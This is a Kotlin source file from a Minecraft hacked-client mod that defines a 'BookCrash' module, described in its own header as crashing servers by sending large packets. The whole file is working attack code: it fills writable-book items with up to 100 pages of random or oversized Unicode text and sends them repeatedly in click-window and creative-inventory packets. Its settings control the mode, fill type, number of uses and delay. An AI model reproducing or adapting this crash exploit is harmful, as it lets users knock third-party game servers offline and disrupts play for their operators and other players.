package me.zeroeightsix.kami.module.modules.misc

import me.zeroeightsix.kami.module.Module
import me.zeroeightsix.kami.setting.Settings
import me.zeroeightsix.kami.util.TimerUtils
import me.zeroeightsix.kami.util.text.MessageSendHelper.sendChatMessage
import net.minecraft.init.Items
import net.minecraft.inventory.ClickType
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTTagCompound
import net.minecraft.nbt.NBTTagList
import net.minecraft.nbt.NBTTagString
import net.minecraft.network.play.client.CPacketClickWindow
import net.minecraft.network.play.client.CPacketCreativeInventoryAction
import java.util.*
import java.util.stream.Collectors
import kotlin.math.min

/**
 * Created by d1gress/Qther on 25/11/2019.
 * Updated by d1gress/Qther on 26/11/2019.
 * Updated by Xiaro on 09/09/20
 */
@Module.Info(
        name = "BookCrash",
        category = Module.Category.MISC,
        description = "Crashes servers by sending large packets"
)
class BookCrash : Module() {
    private val mode = register(Settings.e<Mode>("Mode", Mode.RAION))
    private val fillMode = register(Settings.e<FillMode>("FillMode", FillMode.RANDOM))
    private val uses = register(Settings.integerBuilder("Uses").withValue(5).withMinimum(0))
    private val delay = register(Settings.integerBuilder("Delay").withValue(0).withRange(0, 40))
    private val pages = register(Settings.integerBuilder("Pages").withValue(50).withRange(1, 100))

    private var timer = TimerUtils.TickTimer(TimerUtils.TimeUnit.TICKS)

    override fun onUpdate() {
        if (mc.currentServerData == null || mc.currentServerData.serverIP.isEmpty() || mc.connection == null) {
            sendChatMessage("Not connected to a server")
            disable()
            return
        }

        if (!timer.tick(delay.value.toLong())) return

        val list = NBTTagList()
        var size = ""
        val pageChars = 210

        when (fillMode.value as FillMode) {
            FillMode.RANDOM -> {
                val chars = Random().ints(0x80, 0x10FFFF - 0x800).map { if (it < 0xd800) it else it + 0x800 }
                size = chars.limit(pageChars * pages.value.toLong()).mapToObj<String> { it.toChar().toString() }.collect(Collectors.joining())
            }
            FillMode.FFFF -> {
                size = repeat(pages.value * pageChars, 0x10FFFF.toString())
            }
            FillMode.ASCII -> {
                val chars = Random().ints(0x20, 0x7E)
                size = chars.limit(pageChars * pages.value.toLong()).mapToObj<String> { it.toChar().toString() }.collect(Collectors.joining())
            }
            FillMode.OLD -> {
                size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5"
            }
        }

        for (i in 0 until pages.value) {
            list.appendTag(NBTTagString(size))
        }

        val tag = NBTTagCompound().apply {
            setString("author", "Bella")
            setString("title", "\n Bella Nuzzles You \n")
            setTag("pages", list)
        }
        val bookObj = ItemStack(Items.WRITABLE_BOOK).apply {
            setTagInfo("pages", list)
            tagCompound = tag
        }

        for (i in 0 until uses.value) {
            mc.connection!!.sendPacket(CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, 0.toShort()))
            if (mode.value == Mode.JESSICA) {
                mc.connection!!.sendPacket(CPacketCreativeInventoryAction(0, bookObj))
            }
        }
    }

    private fun repeat(count: Int, with: String): String {
        return String(CharArray(count)).replace("\u0000", with)
    }

    private enum class Mode {
        JESSICA, RAION
    }

    private enum class FillMode {
        ASCII, FFFF, RANDOM, OLD
    }
}